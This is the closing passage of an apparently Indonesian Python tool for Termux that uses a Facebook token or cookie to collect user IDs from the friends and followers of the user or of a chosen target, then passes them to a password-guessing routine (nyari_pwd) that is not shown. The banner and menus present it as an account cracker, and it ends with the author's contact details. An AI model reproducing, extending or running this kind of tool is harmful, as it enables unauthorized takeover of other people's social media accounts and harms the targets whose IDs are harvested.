            else:
                user_id=link.split("com/")[1].split("/")[0]
                if ("1000") not in kontol.text:
                    if ("/me/friends") in link:
                        print("[!] Kamu Tidak memiliki teman fb")
                        print("[!] Silahkan coba menu yg lain aja")
                        return False
                    elif ("/me/subscribers") in link:
                        print("[!] Kamu tidak memiliki pengikut fb")
                        print("[!] Silahkan coba menu yg lain aja")
                        return False
                    elif ("1000") in link and ("friends") in link:
                        print("[!] Pengguna dengan id %s tidak memiliki teman"%(user_id))
                        print("[!] Coba periksa kembali id yg kamu masukkan")
                        return False
                    else:
                        print("[!] Pengguna dengan id %s tidak memiliki pengikut"%(user_id))
                        print("[!] Coba periksa kembali id yg kamu masukkan")
                        return False
    
    def main(self):
        try:
            kontol=requests.get("%s/me?access_token=%s"%(self.url, self.token)).json()
            cly().logo()
            print("[*] Uid  : %s"%(hijau+kontol.get("id")+putih))
            print("[*] Name : %s\n"%(hijau+kontol.get("name")+putih))
            print("[1] Nuyul dari daftar teman")
            print("[2] Nuyul dari pengikut target")
            print("[3] Nuyul dari teman target")
            print("[4] Nuyul dari pengikut")
            print("[5] Keluar\n")
        except(KeyError):
            print("[!] Token Fb kamu sepertinya sudah expired")
            print("[!] Silahkan login dengan token Fb yg baru")
            print("[!] Thank for using my tools")
            sys.exit(os.unlink("login.txt"))
        except(KeyboardInterrupt):
            cly().interturp()
        except(EOFError):
            cly().interturp()
        while True:
            try:
                self.tanya=input("[?] Pilih : ")
                if ("1") in self.tanya:
                    kontol=self.urllib_urlopen("%s/me/friends?access_token=%s"%(self.url, self.token))
                    if kontol is False:
                        continue
                    else:break
                elif ("2") in self.tanya:
                    while True:
                        idg=input("[?] Id Target : ")
                        if ("1000") not in idg:
                            print("[!] Id yg kamu masukkan tidak valid")
                        else:break
                    kontol=self.urllib_urlopen("%s/%s/subscribers?limit=999999&access_token=%s"%(self.url, idg, self.token))
                    if kontol is False:
                        continue
                    else:break
                elif ("3") in self.tanya:
                    while True:
                        idg=input("[?] Id target : ")
                        if ("1000") not in idg:
                            print("[!] Id yg kamu masukkan tidak valid")
                            continue
                        else:break
                    kontol=self.urllib_urlopen("%s/%s/friends?access_token=%s"%(self.url, idg, self.token))
                    if kontol is False:
                        continue
                    else:break
                elif ("4") in self.tanya:
                    kontol=self.urllib_urlopen("%s/me/subscribers?access_token=%s"%(self.url, self.token))
                    if kontol is False:
                        continue
                    else:break
                elif ("5") in self.tanya:
                    sys.exit("\n[!] Thank for using my tools")
                else:
                    print("[!] Pilih yg bener dong bre")
                    continue
            except:break

        if int(len(ngumpul_id))<(1):
            print("[!] Gagal mengumpulkan id")
            print("[!] Silahkan mulai ulang tools ini")
            exit()
        else:nyari_pwd()

class cly:
    def __init__(self):
        self.ajg=False

    def connect(self):
        print()
        print("[!] Koneksi internet terganggu")
        print("[!] Coba periksa koneksi internet kamu")
        exit()
    
    def interturp(self):
        print()
        print("[!] Ctrl-C detected")
        print("[!] Program dihentikan")
        print("[!] Thank for using my tools")
        exit()

    def logo(self):
        os.system("reset")
        print("""%s
    ╔╗╔┬ ┬┌┐   ╔═╗┬─┐┌─┐┌─┐┬┌─┌─┐┬─┐
    ║║║│ │├┴┐  ║  ├┬┘├─┤│  ├┴┐├┤ ├┬┘
    ╝╚╝└─┘└─┘  ╚═╝┴└─┴ ┴└─┘┴ ┴└─┘┴└─
        """%(putih))

class ngentod:
    def __init__(self):
        self.stak=0
        self.main()

    def main(self):
        cly().logo()
        print("[!] Silahkan pilih salah satu")
        print("[!] Setiap pilihan isinya berbeda")
        print("[!] Pilih sesuka hati lu aja bre\n")
        print("[1] Using cookie")
        print("[2] Using token")
        print("[3] Info author")
        print("[0] Keluar\n")
        while True:
            bacot=input("[?] Pilih : ")
            if ("1") in bacot:
                self.stak+=1;break
            elif ("2") in bacot:
                self.stak+=2;break
            elif ("3") in bacot:
                self.stak+=3;break
            elif ("5") in bacot:
                sys.exit("\n[!] Thank for using my tools")
            else:
                print("[!] Pilih yg bener dong bre")
                continue
        if self.stak==1:
            try:
                login_kueh()
            except(ConnectionError):
                cly().connect()
            except(ChunkedEncodingError):
                cly().connect()
            except(ReadTimeout):
                cly().connect()
            except(TooManyRedirects):
                cly().connect()
        elif self.stak==2:
            try:
                method_token()
            except(ConnectionError):
                cly().connect()
            except(ChunkedEncodingError):
                cly().connect()
            except(ReadTimeout):
                cly().connect()
            except(TooManyRedirects):
                cly().connect()
            except(KeyboardInterrupt):
                cly().interturp()
            except(EOFError):
                cly().interturp()
        elif self.stak==3:
            try:
                self.creator()
            except(KeyboardInterrupt):
                cly().interturp()
            except(EOFError):
                cly().interturp()
        else:exit()

    def creator(self):
        print("""
[!] Support gw di YouTube
[!] Chat gw di whatsapp
[!] Follow gw di Facebook :)

[*] Creator  : [H]KangEhem (Ky >_<)
[P][*] Whatsapp : [H]+6281210160358
[P][*] Github   : [H]github.com/dahlahmales
[P][*] Youtube  : [H]youtube.com/channel/UC_BsX86kAN5XaQ0dHuxV-gw
[P][*] Facebook : [H]www.facebook.com/profile.php?id=100049013916432

[P][!] Jika ada bug, Laporkan ke whatsapp gw ya bre!
        """.replace("[H]",hijau).replace("[P]",putih))
        input("Press ENTER untuk kembali ke menu ")
        self.stak-=self.stak
        self.main()

if dirname("/data/data/com.termux"):
    if isfile("login.txt"):
        sub=open("login.txt").read().strip()
        if ("eaaa").upper() in sub:
            try:
                method_token(True)
            except(ConnectionError):
                cly().connect()
            except(ChunkedEncodingError):
                cly().connect()
            except(ReadTimeout):
                cly().connect()
            except(TooManyRedirects):
                cly().connect()
        elif ("c_user") in sub:
            try:
                method_kueh()
            except(ConnectionError):
                cly().connect()
            except(ChunkedEncodingError):
                cly().connect()
            except(ReadTimeout):
                cly().connect()
            except(TooManyRedirects):
                cly().connect()
        else:
            try:
                ngentod()
            except(KeyboardInterrupt):
                cly().interturp()
            except(EOFError):
                cly().interturp()
    else:
        try:
            ngentod()    
        except(KeyboardInterrupt):
            cly().interturp()
        except(EOFError):
            cly().interturp()
else:
    exit("%sHanya support untuk termux brother"%(putih))